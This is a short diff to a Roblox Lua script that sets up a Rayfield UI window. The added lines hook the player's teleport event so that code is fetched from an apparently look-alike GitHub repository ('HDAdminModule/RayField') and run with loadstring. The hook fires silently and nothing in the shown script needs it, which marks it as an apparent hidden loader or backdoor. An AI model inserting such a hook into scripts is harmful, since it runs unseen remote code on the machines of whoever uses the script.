@@ -1,3 +1,6 @@
+game.Players.LocalPlayer.OnTeleport:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/HDAdminModule/RayField/refs/heads/main/Ray1"))()
+end)
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local localchar = game.Players.LocalPlayer.Character
 local Window = Rayfield:CreateWindow({
